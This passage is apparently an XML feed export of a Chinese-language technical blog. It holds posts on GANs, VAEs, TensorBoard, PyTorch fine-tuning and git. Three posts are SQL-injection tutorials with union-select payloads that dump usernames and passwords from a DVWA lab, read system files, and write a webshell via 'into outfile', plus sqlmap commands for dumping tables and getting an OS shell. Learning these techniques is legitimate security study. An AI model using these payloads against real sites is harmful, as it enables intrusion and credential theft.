因此生成器采用了一种与log（1-x）的更新方向一致并且在起始时斜率更大的函数。 ​ E_{x\in P_{G}}[-logG(D(x))] ​ 该损失函数在代码实现中一般还是使用反标签的二进制交叉熵损失函数来进行实现，所谓反标签即为将生成的样本标注为1进行训练（正常生成样本标签为0），涉及到该部分的代码为： 123456789101112131415161718criterion = nn.BCELoss()g_optimizer = torch.optim.Adam(D.parameters(), lr=0.0002)real_label = torch.ones(batch_size, 1) # 生成模型根据随机输入生成fake_images,然后判别模型进行判别z = torch.randn(batch_size, latent_size)fake_images = G(z)outputs = D(fake_images)# 训练生成模型，使用反标签的二进制交叉熵损失函数g_loss = criterion(outputs, real_labels)# 反向传播和优化reset_grad()g_loss.backward()g_optimizer.step() GAN与VAE对比​ GAN和VAE都是样本生成领域非常常用的两个模型流派，那这两种模型有什么不同点呢？ VAE进行对抗样本生成时，VAE的Encoder和GAN的Generator输入同样都为图片等真实样本，但VAE的Encoder输出的中间结果为隐藏向量值，而GAN的Generator输出的中间结果为生成的图片等生成样本。 最终用来生成样本的部分不同。VAE最终使用Decoder部分来进行样本生成，GAN使用Generator进行样本生成。 ​ 在实际的使用过程中还存在这下面的区别使GAN比VAE更被广泛使用： VAE生成样本点的连续性不好。VAE进行生成采用的方式是每个像素点进行生成的，很难考虑像素点之间的联系，因此经常出现一些不连续的坏点。 要生成同样品质的样本，VAE需要更大的神经网络。 【参考文献】 李宏毅在线课程:https://www.youtube.com/watch?v=DQNNMiAP5lw&amp;list=PLJV_el3uVTsMq6JEFPW35BCiOQTsoqwNw GAN损失函数详解:https://www.cnblogs.com/walter-xh/p/10051634.html]]></content>
      <tags>
        <tag>对抗样本生成</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对抗样本生成——VAE]]></title>
    <url>%2F2020%2F02%2F12%2F%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94VAE%2F</url>
    <content type="text"><![CDATA[​ 最近由于进行一些类文本生成的任务，因此对文本生成的相关的一些经典的可用于样本生成的网络进行了研究，本系列文章主要用于对这些模型及原理与应用做总结，不涉及复杂的公式推导。 相关文章： 对抗样本生成—VAE 对抗样本生成—GAN) 对抗样本生成—DCGAN) 对抗样本生成—文本生成 AE(Auto Encoder)​ Auto Encoder中文名自动编码机，最开始用于数据压缩任务，例如：Google曾尝试使用该技术将图片再网络上只传输使用AE压缩过的编码值，而在本地进行还原来节约流量。后来也用于样本生成任务，但是用于样本生成存在着一些不可避免的问题，因此很快被VAE所取代。Auto Encoder结构如下所示： ​ 主要由Encoder和Decoder两部分组成，Encoder负责将原始的图片、文本等输入压缩成更低纬度的向量进行表示，Decoder负责将该向量表示进行复原，然后通过最小化Encoder输入与Decoder输出来进行两部分模型参数的优化。 ​ 训练完成后，训练好的Encoder部分可以输入图片等数据进行数据压缩； AE进行数据压缩的特点： 1.只能压缩与数据高相关度的数据 2.有损压缩 ​ 训练好的decoder可以输入随机的向量值生成样本，下图为样本生成示意图。 AE在进行样本生成时存在的问题： 1.当输入随机向量进行样本生成时，decoder部分输入的是一个随机的向量值，而AE只能保证训练集中有的数据具有比较好的效果，但是无法保证与训练集中的数据很接近的值依旧能够准确的进行判断（不能保证不存在跳变）。 2.没有随心所欲的去构造向量。因为输入的向量必须由原始的样本区进行构造隐藏编码，才能进行样本生成。 VAE(Varaient Auto Encoder)​ Variational Autoencoder中文名称变分自动编码器，是Auto Encoder的进化版，主要用于解决AE中存在的无法随心所欲的去生成样本，模型存在跳变等问题。核心思想为在生成隐藏向量的过程中加入一定的限制，使模型生成的样本近似的遵从标准正态分布，这样要进行样本生成我们就可以直接向模型输入一个标准正态分布的隐向量即可。有需要完整版代码的同学可以参见我的github ​ VAE结构如上图所示。与AE一样，VAE的主要结构依然是分为Encoder和Decoder两个主要组成部分，这两部分可以使用任意的网络结构进行实现，而其中的不同点主要在于隐向量的方式不同和因此导致生成样本所需的原料不同。 ​ VAE的使用过程中，需要在模型生成样本的准确率与生成隐向量符合正态分布的成都之间做一个权衡，因此在VAE中loss中包含两部分：均方误差、KL散度。均方误差用来衡量原始图片与生成图片之间的误差，KL散度用于表示隐含向量与标准正态分布之间的差距，其计算公式如下所示： ​ DKL(P||Q) = \int_{-\infty}^{\infty} P(x)log\frac{p(x)}{q(x)}dx ​ KL散度很难进行计算，因此在VAE中使用了一种”重新参数化“技巧来解决。即VAE的encoder不再直接输出一个隐含向量，而是生成两个向量，一个代表均值，一个代表方差，然后通过这两个向量与一个标准正态分布向量去合成出一个符合标准整体分布的隐含向量。其合成计算公式为： ​ z = \mu+\sigma \cdot \epsilon ​ 其中，u为均值向量，$\sigma$为方差向量，$\epsilon$为标准的正态分布向量。 ​ 而VAE的代码实现也非常的简单，其核心的代码实现如下所示： 12345678910111213141516171819202122232425262728293031class VAE(nn.Module): def __init__(self, image_size=784, h_dim=400, z_dim=20): super(VAE, self).__init__() self.fc1 = nn.Linear(image_size, h_dim) self.fc2 = nn.Linear(h_dim, z_dim) # 均值 向量 self.fc3 = nn.Linear(h_dim, z_dim) # 保准方差 向量 self.fc4 = nn.Linear(z_dim, h_dim) self.fc5 = nn.Linear(h_dim, image_size) # 编码过程 def encode(self, x): h = F.relu(self.fc1(x)) return self.fc2(h), self.fc3(h) # 随机生成隐含向量 def reparameterize(self, mu, log_var): std = torch.exp(log_var/2) eps = torch.randn_like(std) return mu + eps * std # 解码过程 def decode(self, z): h = F.relu(self.fc4(z)) return F.sigmoid(self.fc5(h)) # 整个前向传播过程：编码-》解码 def forward(self, x): mu, log_var = self.encode(x) z = self.reparameterize(mu, log_var) x_reconst = self.decode(z) return x_reconst, mu, log_var ​ 在我的github上还有完整的将VAE应用到手写数字生成的代码，需要的同学可以关注一下。 总结​ VAE与AE的对比： 1.隐藏向量的生成方式不同。 ​ AE的Encoder直接生成隐藏向量，而VAE的Encoder是生成均值向量和方差向量再加上随机生成的正态分布向量来进行合成隐藏向量。 2.样本生成能力不同。这也是AE在对抗样本生成领域中很少被使用的主要原因 ​ AE要进行样本生成只能使用已有样本生成的隐含向量作为输入输入到Decoder中，由于已有样本有限，因此能够生成的对抗样本数量有限。 ​ VAE可以直接使用符合正态分布的任意向量直接输入到Decoder中进行样本生成，能够任意进行样本生成。]]></content>
      <tags>
        <tag>对抗样本生成</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入——通过sqlmap进行getshell常见的问题]]></title>
    <url>%2F2020%2F01%2F20%2Fsql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87sqlmap%E8%BF%9B%E8%A1%8Cgetshell%E5%B8%B8%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[​ 在上一篇文章中，我们提到了要使用sqlmap中自带的os-shell命令直接getshell要有下面四个先条件： 1.当前注入点为root权限 2.已知网站绝对路径 3.php转义功能关闭 4.secure_file_priv= 值为空 在本文中将针对在实际环境中使用sqlmap进行getshell如何获取这些先决条件来进行详细介绍。 1.确认注入点权限​ 首先要确认注入点权限是否为root权限，可以直接使用sqlmap自带的测试命令is-dba 1sqlmap -u 网址 --is-dba 2.网站的绝对路径​ 获取网站的绝对路径在可以先进入sql-shell: 1sqlmap -u 网址 --sql-shell ​ 然后再在sql-shell中直接使用sql命令读取数据库文件存放路径： 1sql-shell&gt; select @@datadir; 然后通过数据库文件的位置进行网站所在的绝对路径进行猜测。]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入——手工注入]]></title>
    <url>%2F2020%2F01%2F18%2Fsql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[​ 本文主要对手工方式sql注入进行介绍，包括sql注入的介绍和分类、sql注入中常用的关键字与敏感函数、经典的手工注入、利用sql注入进行文件的写入与读取等几部分。 ​ 后续的sql注入系列文章还将对使用sqlmap进行sql注入以及进行sql注入过程常见的一些关键问题做阐述，可以参见后面的文章： sql注入——sqlmap6步注入法 sql注入——通过sqlmap进行getshell常见的问题 sql注入介绍与分类​ graph LR A(sql注入) --> B(普通注入) A --> C(圆角长方形) C-->D(布尔型盲注) C-->E(延时盲注) ​ 常见的sql注入主要分从注入结果的展现形式上分为普通注入和盲注两大类。最简单也是最常见的就是普通话的sql注入了，这种注入方式进行注入有直观展示的结果进行结果展示，一般可以直接使用union语句进行联合查询获取信息上传文件等操作，后续在经典手工注入流程中讲述的就是使用普通注入进行sql注入。 ​ 另外一大类sql注入就是盲注，这种sql注入方式一般用于页面并没有对sql注入的查询结果直接进行返回，只能通过返回的一些其他信息判断注入的片段是否正确进行了执行。其中根据页面返回的布尔值(页面是否正确返回)进行sql注入称为布尔型盲注，根据页面返回时间的差异确定注入是否成功的sql注入称为延时盲注。下面是一个最常用延时注入的例子： 在上面的例子中，再过个浏览器控制器的控制台中，可以看到该请求存在着10s左右的等待时间，也即是说明我们前面的进行拼遭的sql注入语句正确的进行了执行，因此可以判断该部分是一个可以进行利用的注入点。本文重点介绍一般的注入，关于盲注的具体使用将在后续的文章中进行介绍。 2.sql 注入中常用的关键字和系统表sql注入中常用到的sql关键字 表达式 描述 union 将查询结果进行联合输出，追加在列尾 union all load 文件读取 into outfile 文件写入 @@datadir 数据库文件存放路径 user() 当前用户 version() 数据库版本 database() 数据库名称 sleep(n) 延时执行n秒 @@表示系统变量 mysql中常用的系统表 数据库 表名 描述 information_schema tables mysql中存储的全部表名，使用table_schema指定数据库名 select table_schema.tables where table_scheama=数据库名 information_schema columns mysql中存储全部其他表的字段名，使用table_name指定表名 select information_schema.columns where table_name=表名 Information_schema是mysql中自带的一个数据库，这个数据库中包含了其他数据的各种信息，包括数据库中的表名、权限、字段名等。 3.经典手工注入流程1.注入点测试​ 注入点测试主要分为是否存在sql注入检测与sql注入类型检测两个部分。要检测时候否存在sql注入只需要在要进行检测的参数后面加单引号，看是会因’个数不匹配而报错（这里的报错不一定是真的报错，可能只是页面不在正常显示之前的内容也可以看做报错的一种）。 1http://xxx/abc.php?id=1' ​ sql注入的注入点的类型主要分为数字型注入点和字符型注入点两种，分别对应着要进行sql注入的参数值在数据库中存储的类型是字符型还是数字型，直接影响到后面进行后续的注入的一些细节。 数字型检测​ 当输入变量的类型为数字类型时，可以使用and 1=1和and 1=2配合进行注入点类型进行检测: Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步。 Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。 原因为: 如果当前注入点类型为数字型， ​ 当输入 and 1=1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=1,没有语法错误且逻辑判断为正确，所以返回正常。 ​ 当输入 and 1=2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=2,没有语法错误但是逻辑判断为假，所以返回错误。 而如果该注入点类型为字符型， ​ 当输入and 1=1和 and 1=2时，后台执行sql语句：select * from &lt;表名&gt; where id=&#39;x and 1=1&#39;和 select * from &lt;表名&gt; where id=&#39;x and 1=1,将and语句作为字符进行id匹配，应该都没有查询结果，与事实不符因此该注入点为数字型注入点。 字符型注入点检测当输入变量为字符型时，可以使用’’ and ‘1’=’1和 ‘ and ‘1’=’2配合进行注入点类型检测： 1.Url 地址中输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 页面依旧运行正常，继续进行下一步。 2.Url 地址中继续输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2&#39; 页面运行错误，则说明此 Sql 注入为数字型注入。 原因与上面的数字型注入点检测原理类似，这里就不进行详细讲述了，感兴趣的读者可以自己尝试解释一下。 2.当前表行数测试​ 这里之所以要进行数据表行数测试是因为后面使用union进行联合查询时，明确后面要进行合并查询的列数。 要进行列数测试要使用order by进行测试，不断增加后面的数字，直到出错为止。 1http://xxx/abc.php?id=x order by 8 下面为使用dvwa进行注入测试时的行数测试为例，当使用oder by 1和2时，页面正常显示 当将数字升到3是，产生如下报错，因此我们可以知道该表中只有两行。 3.测试当前表中那些列有回显123# and 1=2为了不展示本改进心跳查询的内容，只展示union进行联合查询的内容# 最后的#是为了闭合本来sql语句中后面的‘http://xxx/abc.php?id=x and 1=2 union select 1,2# 这里dvwa表中本身就只有两列数据全部在前台进行显示 4.查询数据库名称​ 查询当前数据库名称我们可以直接使用数据库内置函数database()进行获取，利用该函数进行当前数据库名称获取的典型注入代码如下所示: 12# 这里将database函数卸载第二个参数位置处，将在第二个参数展示的位置进行展示。也可以写在第一个参数位置http://xxx/abc.php?id=x and 1=2 union select 1,database()# ​ 这里获取到了mysql中存在着名为dvwa的数据库 5.数据表名获取​ 表名获取利用系统自带数据中（mysql中的information_schema）中的tables表中的内容进行获取。tables表中常用的字段如下表所示： 数据表 字段 含义 tables table_schema 字段所属的数据库名 tables table_name 字段所属的表名 ​ 使用下面的语句进行表名探索： 1http://xxx/abc.php?id=x and 1=2 union select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos;# 6.字段获取​ 字段获取利用系统自带的数据库（mysql中的information_schema）中的columns表中内容进行获取。columns表中常用字段如下表所示： 数据表 字段 含义 columns table_schema 字段所属的数据库名 columns table_name 字段所属的表名 columns column_name 字段名称 ​ 使用下面语完成对指定表中的字段名称进行探索： 1http://xxx/abc.php?id=x and 1=2 union select 1,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name=&apos;users&apos;# ​ 从上面的例子中我们可以看到在users表中存在着User和Password两个字段保存着网站管理员的用户和密码，接下来就可以直接对这两列的内容进行获取了。 7.读取关键字段1http://xxx/abc.php?id=x and 1=2 union select user,password from dvwa.users # 4.文件的写入读取​ 除了上面的基本的注入步骤外，找到注入点后还可以直接利用sql注入漏洞进行进一步的文件相关操作，可以直接通过sql注入实现对文件的读取与写入，利用文件的写入功能实现webshell的上传、系统用户名密码获取等功能。 读取文件​ 在具有文件写入权限时常常可以直接使用进行文件读取，读取到文件后可以xxx 1=1&apos; and 1=2 union select laod_file(&apos;/etc/password&apos;) # 文件写入​ 在具有文件写入权限时可以使用文件读取命令写入小马文件，获取shell。 1=1 and 1=2 union select ’小马文件内容‘into outfile '文件目录+文件名']]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入——sqlmap6步注入法]]></title>
    <url>%2F2020%2F01%2F17%2Fsql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqlmap6%E6%AD%A5%E6%B3%A8%E5%85%A5%E6%B3%95%2F</url>
    <content type="text"><![CDATA[​ 前段时间一直在研究Webshell相关内容，涉及到使用sql注入进行getshell，因此准备对于sql注入过程做一个比较系统的总结，sql注入部分主要分为sqlmap6步法和手工注入法两部分，本文将主要针对sqlmap注入法进行介绍，手工注入法将在下一篇文章中进行介绍。 sqlmap注入6步法​ 首先要进行介绍的就是sql注入到getshell的常见6步法，该方法涵盖了整个过程常见的全部关键步骤。本文主要介绍使用sqlmap工具来进行sql注入的过程。 1.判定是否存在注入点 12345# 对提供的网址进行注入点测试 sqlmap -u http://xxx/id=??? --batch --batch:表示全部需要人机交互的部分采用默认选项进行选择 --cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数 --r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定 输出结果： 2.数据库名获取 123# 获取数据库名称sqlmap -u "http://xxx/id=???" --current-db --batch --cunrrent-db：进行数据库探测选项 输出结果： 3.获取数据库中的表名 1234# 获取表名sqlmap -u "http://xxx/id=???" --D 数据库名称 --tables --batch -D：指定要探测数据库名称 --tables：进行表名探索选项 输出结果： 4.对选定表的列名进行获取 1234# 获取表中字段名称sqlmap -u "http://xxx/id=???" --D 数据库名称 --T 表名 --columns --batch -D：指定要进行探索的表 -columns：进行字段名称探索选项 输出结果： 5.探测用户名密码 1234# 获取用户名和密码并保存到指定文件sqlmap -u "http://xxx/id=???" --D 数据库名称 --T 表名 --C 用户名列名,密码列名 --dump -C:指定选择的列名 --dump：将内容输出到文件 输出结果： 6.获取shell ​ os-shell只是一个辅助上传大马、小马的辅助shell，可以使用也可以直接利用数据库备份功能人工上传大、小马不进行这一步。 12# 获取os-shellsqlmap -u "http://xxx/id=???" --os-shell ​ 这里使用os-shell需要很高的权限才能成功使用。具体需要的权限包括： 1.网站必须是root权限 2.了解网站的绝对路径 3.GPC为off，php主动转义的功能关闭 4.secure_file_priv= 值为空 ​ 使用sqlmap存在一种缓存机制，如果完成了一个网址的一个注入点的探测，下次再进行探测将直接使用上次探测的结果进行展示，而不是重新开始探测，因此有时候显示的结果并不是我们当下探测进型返回的，面对这种情况就加上选项。 1--purge 清除之前的缓存日志 ​ 本文中提到的是一个标准的简单环境的sql注获取方式，但是在实际环境中，进行sql注入还存在权限不足、不知道绝对路径等关键问题，这些问题将在[sql注入——getshell中的问题]中进行具体讲述。]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>Web安全</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pytorch_tensorboard使用指南]]></title>
    <url>%2F2019%2F11%2F15%2Fpytorch-tensorboard%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[​ 最近pytorch官网推出了对tensorboard支持，因此最近准备对其配置和使用做一个记录。 安装​ 要在使用pytorch时使用tensorboard进行可视化第一就是软件的安装，整个过程中最大的问题就是软件的兼容性的问题了，下面是我再使用过程中确定可兼容的版本： 123python 3.xpytorch 1.1.0tensorboard 1.1.4 ​ 兼容的基础软件安装完成后，在安装依赖包 1pip install tensorboard future jupyter ​ 安装成功后就可以直接在正常编写的pytorch程序中加入tensorboard相关的可视化代码，并运行。下面是测试代码： 12345678910111213141516171819202122232425import torchimport torch.nn as nnfrom torch.utils.tensorboard import SummaryWriter# 定义网络class Test_model(nn.Module): def __init__(self): super(Test_model, self).__init__() self.layer = nn.Sequential( nn.Linear(3, 256), nn.ReLU(), nn.Linear(256, 256), nn.ReLU(), nn.Linear(256, 10) ) def forward(self, x): return self.layer(x)model = Test_model()writer = SummaryWriter()writer.add_graph(model, input_to_model=torch.randn((3,3)))writer.add_scalar(tag="test", scalar_value=torch.tensor(1) , global_step=1)writer.close() ​ 运行成功后，就可以使用shell进入到项目的运行文件的目录,这是可以看到目录下产生了一个新的runs目录，里面就是运行上面代码产生出的可视化文件。在文件的目录中输入 1tensorboard --logdir=runs 注意：这里输入命令的目录一定要为文件的运行目录，runs文件夹的外面。 ​ 最后，按照提示在浏览器中打开http://localhost:6006，显示如下网页，恭喜你成功了 TensorBoard常用功能​ tensorBoard之所以如此受到算法开发和的热捧，是因为其只需要是使用很简单的接口，就可以在实现很复杂的可视化功能，可以我们更好的发现模型存在的各种问题，以及更好的解决问题，其核心功能包括： 1.模型结构可视化 2.损失函数、准确率可视化 3.各层参数更新可视化 在TensorBoard中提供了各种类型的数据向量化的接口，主要包括： pytorch生成函数 pytorch界面栏 显示内容 add_scalar SCALARS 标量(scalar)数据随着迭代的进行的变化趋势。常用于损失函数和准确率的变化图生成 add_graph GRAPHS 计算图生成。常用于模型结构的可视化 add_histogram HISTOGRAMS 张量分布监控数据随着迭代的变化趋势。常用于各层参数的更新情况的观察 add_text TEXT 观察文本向量在模型的迭代过程中的变化。 ​ 下面将具体介绍使用各个生成函数如何常用的功能。 1.模型结构可视化（add_scalae使用）​ 模型结构可视化一般用于形象的观察模型的结构，包括模型的层级和各个层级之间的关系、各个层级之间的数据流动等，这里要使用的就是计算图可视化技术。 ​ 首先，无论使用TensorBoard的任何功能都要先生成一个SummaryWriter，是一个后续所有内容基础，对应了一个TensorBoard可视化文件。 123456from torch.utils.tensorboard import SummerWriter# 这里的参数主要有三个# log_dir 文件的生成位置,默认为runs# commment 生成文件内容的描述，最后会被添加在文件的结尾writer = SummaryWriter(logdir="xxx",commit='xxx') ​ 然后正常声明模型结构。 123456789101112class Test_model(nn.Module): def __init__(self): super(Test_model, self).__init__() self.layer = nn.Sequential( nn.Linear(3, 256), nn.ReLU(), nn.Linear(256, 256), nn.ReLU(), nn.Linear(256, 1) ) def forward(self, x): return self.layer(x) ​ 在前面创建的writer基础上增加graph，实现模型结构可视化。 123456789model = Test_Model()# 常见参数# model 要进行可视化的模型# input_to_model 要输入到模型中进行结构和速度测试的测试数据writer.add_graph(model,torch.Tensor([1,2,3]))# writer关闭writer.close() 注意：模型结构和各层速度的测试是在模型的正常训练过程中使用，而是在模型结构定义好以后，使用一些随机自定义数据进行结构可视化和速度测试的。 ​ 最终在TensorBoard的GRAPHS中可以看到模型结构(点击查看具体的模型结构和各个结构所内存和消耗时间) 2.损失函数准确率可视化​ 损失函数和准确率更新的可视化主要用于模型的训练过程中观察模型是否正确的在被运行，是否在产生了过拟合等意外情况，这里主要用到的是scalar可视化。 ​ 损失函数和准确率的可视化主要用在训练部分，因此假设模型的声明已经完成，然后进行后续的操作： 1234567891011121314151617181920212223# 将模型置于训练模式model.train()output = model(input_data)writer = SummaryWriter(comment='测试文件')# 标准的训练model.train()for epoch in range(10): optimizer.zero_grad() output_data = model(input_data) loss = F.cross_entropy(output_data,label) pred = output_data.data.max(1)[1] acc = pred.eq(label).sum() loss.backward() optimizer.step() # 在每一轮的训练中都进行acc和loss记录，写入tensrboard日志文件 writer.add_scalar(tag='acc',scalar_value=acc,global_step=epoch) writer.add_scalar(tag="loss", scalar_value=loss,global_step=epoch) # 关闭tensorboard写入器writer.close() ​ 最终效果如下图。 3.各层参数更新可视化​ 各层参数可视化，是发现问题和模型调整的重要依据，我们常常可以根据再训练过程中模型各层的输出和各层再反向传播时的梯度来进行是否存在梯度消失现象，具体的使用可以参照文章如何发现将死的ReLu。 ​ 下面我们来具体讲解如何进行各层参数、输出、以及梯度进行可视化。这里用的主要是add_histgram函数来进行可视化。 123456789101112131415161718192021222324252627# 将模型置于训练模式model.train()output = model(input_data)writer = SummaryWriter(comment='测试文件')# 标准的训练model.train()for epoch in range(10): optimizer.zero_grad() output_data = model(input_data) loss = F.cross_entropy(output_data,label) pred = output_data.data.max(1)[1] acc = pred.eq(label).sum() loss.backward() optimizer.step() # 在每一轮的训练中都记录各层的各个参数值和梯度分布，写入tensrboard日志文件 for tag, value in model.named_parameters(): tag = tag.replace('.', '/') # 记录各层的参数值 writer.add_histogram(tag, value.data.cpu().numpy(), epoch) # 记录各层的梯度 writer.add_histogram(tag+'/grad', value.grad.data.cpu().numpy(), epoch) # 关闭tensorboard写入器writer.close() ​ 最终效果如下图所示。 注：在histogram中，横轴表示值，纵轴表示数量，各条线表示不同的时间线(step\epoch)，将鼠标停留在一个点上，会加黑显示三个数字，含义是：在step xxx1时，有xxx2个元素的值（约等于）xxx3。]]></content>
      <tags>
        <tag>数据分析</tag>
        <tag>pytorch</tag>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pytorch——自动更新学习速率]]></title>
    <url>%2F2019%2F11%2F14%2Fpytorch%E2%80%94%E2%80%94%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0%E5%AD%A6%E4%B9%A0%E9%80%9F%E7%8E%87%2F</url>
    <content type="text"><![CDATA[​ 在深度学习模型的梯度下降过程中，前期的梯度通常较大，因此一可以使参数的更新更快一些，参数更新的后去，梯度较小，因此可以让更新的速率慢一些进行精确的下降，而直接使用optimizer只能直接将lr(学习速率)设置为固定值，因此常常会遇到需要手动进行学习速率调节的情况，本文重点讲解如何自己编写动态调节模型学习速率。 ​]]></content>
      <tags>
        <tag>深度学习</tag>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github基本使用]]></title>
    <url>%2F2019%2F11%2F13%2Fgithub%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8-1%2F</url>
    <content type="text"><![CDATA[​ 之前对github一直就是简单的使用，最近找完工作终于优势间静下来好好地研究下github和git，这个系列博客就用来记录在github学习过程中的新get到的一些点。 1.Git邮箱姓名设置​ 在我们最开始进行本地git设置时，一般都要使用 12git config --global user.name "xxx"git config --gobal user.email "xxx" 进行姓名和邮箱设置，对这个已知都是使用自己的常用邮箱和真实名，对于安全专业的硕士真是是很蠢的行为。 这里设置的姓名和邮箱都是会在github上公开仓库时随着日志一起进行公开的！因此不要使用隐私的信息 ​ 要进行更改可以直接修改~/.gitconfig中的内容进行重新设置。 123[user] name = “abc” email = xxx@qq.com 2.github中的watch、star、fork​ 用好github正确的使用好watch、star、fork是非常重要的一步，这关系到你能不能正确的进行喜欢项目的跟踪。下面是对这三张常见的操作进行的介绍： watch​ watch即观察该项目，对一个项目选择观察后只要有任何人在该项目下面提交了issue或者issue下面有了任何留言，通知中心就会进行通知，如果设置了个人邮箱，邮箱同时也会受到通知。 如何正确的接收watching 通知消息推荐看这一篇文章 Star​ Star意思是对项目打星标（也就是点赞）,一个项目的点赞数目的多少很大程度上是衡量一个项目质量的显而易见的指标。 Star后的项目会专门加入一个列表，在个人管理中可以回看自己Star的项目。 fork​ 使用fork相当于你对该项目拥有了一份自己的拷贝，拷贝是基于当时的项目文件，后续项目发生变化需要通过其他方式去同步。 使用很少，除非是想在一个项目的基础上想建设自己的项目才会用到 使用建议 1.对于一些不定期更新新功能的好项目使用watch进行关注 2.认为一个项目做得不错，使用star进行点赞 3.在一个项目的基础上想建设自己的项目，使用fork 3.Git版本回退已经进行add，但还没有进行commit123git status 先看一下add 中的文件 git reset HEAD 如果后面什么都不跟的话 就是上一次add 里面的全部撤销了 git reset HEAD XXX/XXX/XXX.java 就是对某个文件进行撤销了 本地已经进行了commit，但是还没有更新到远程分支12345# 先找到要进行会退的版本idgit log # 进行本地仓库回退git reset --hard 提交的编号 远程分支已进行进行同步​ 其实就是先进性本地分支回退，然后将本都分支强制push到远程。 12345678# 先找到要进行会退的版本idgit log # 进行本地仓库回退git reset --hard 提交的编号# 强制将本地分支push到远程git push -f ​]]></content>
  </entry>
  <entry>
    <title><![CDATA[pytorch——自定义损失函数]]></title>
    <url>%2F2019%2F11%2F08%2Fpytorch%E2%80%94%E2%80%94%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"></content>
      <tags>
        <tag>深度学习</tag>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pytorch——finetune常用代码]]></title>
    <url>%2F2019%2F11%2F07%2Fpytorch%E2%80%94%E2%80%94finetune%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[fine-tune整体流程 1.加载预训练模型参数 2.修改预训练模型，修改其后面的层为适合自己问题的层 3.设置各层的可更新性。前面和预训练模型相同的部分不再进行训练，后面新加的部分还要重新进行训练 4.检查各层可更新性（可选） 5.设置优化器只对更新前面设置为可更新的部分。 1.加载预训练模型​ 一般在fine-tune中的第一步是首先加载一个已经预训练好的模型的参数，然后将预加载的模型后面的部分结构改造成自己需要的情况。其中包括两种情况： 1.单单将其中的一两个单独的层进行简单的改造（如预训练的模型输出的类为1000类，目前想要使用的模型只包含两个类），使用原有的预训练模型。 2.使用预训练模型的参数，但是后面的层需要更换为比较复杂的模型结构（常见的就是并行结构） 1.使用torchvision中已经预训练好的模型​ 使用torchvision中已经预训练好的模型结构和参数，然后直接将尾部进行修改。 123456from torchvision import modelsfrom torch import nn# 加载torchvision中已经训练好的resnet18模型，并且采用预训练的参数resnet = models.resnet18(pretrained=True)# 最后一层重新随机参数，并且将输出类别改为2resnet.fc = nn.Linear(512,2) 2.使用自己预训练好的模型，并且将输出的结果设置为并行结构​ 这里主要实现了之前自己已经预训练了，重新定义整体模型的结构（创建一个新的模型类），然后将共有部分的参数加载进来，不同的地方使用随机参数。 注意：这里面新旧模型要共用的层名称一定要一致 123456789101112131415from models import TextCNN#加载新的模型结构，这里面的Text_CNN_Regression_Class模型结构已经设置为和之前的Text_CNN模型整体结构一致，最后的全连接层改为一个分类输出头加一个回归输出头model = Text_CNN_Regression_Class(len(FILE_TYPE_COL))# 加载预训练的模型的参数pretrained_dict = torch.load("../model/Text_CNN_add_filetype_1:1_epoch5.state")# 加载新的模型结构的初始化参数model_dict = model.state_dict()# 将pretrained_dict里不属于model_dict的键剔除掉pretrained_dict = &#123;k: v for k, v in pretrained_dict.items() if k in model_dict&#125;#如果你的k在预备训练当中，那么你的参数需要做转换，否则为原先的# 更新现有的model_dictmodel_dict.update(pretrained_dict)#利用预训练模型的参数，更新你的模型# 加载我们真正需要的state_dictmodel.load_state_dict(model_dict) 2.将指定层设置为参数更新，其余设置为参数不更新​ 在fine-tune过程中经常用到的操作就是将整个神将网络的前半部分直接采用预训练好的模型参数，不再进行更新，这里主要实现了已经加载了预训练模型的参数，固定了除最后一个全连接层全部参数。 1234567#对于模型的每个权重，使其不进行反向传播，即固定参数for param in resnet.parameters(): param.requires_grad = False#将其中最后的全连接部分的网路参数设置为可反向传播for param in resnet.fc.parameters(): param.requires_grad = True 3.查看各层参数以及是否进行梯度更新（可选）​ 在fine-tune的过程中需要检查是不是已经将不需要更新梯度的层的各个参数值已经设置为不进行梯度更新，这是可以使用下面的代码进行查看: 1234for child in resnet.children(): print(child) for param in child.parameters(): print(param.requires_grad) 4..将优化器设置为只更新需要更新的部分参数​ 这里主要用于前面的各个参数是否进行更新已经设置完成后的最后一步，完成这一部就可以只接将优化器直接用于整个神经网络的重新训练了。 1optimizer = optim.SGD(filter(lambda p: 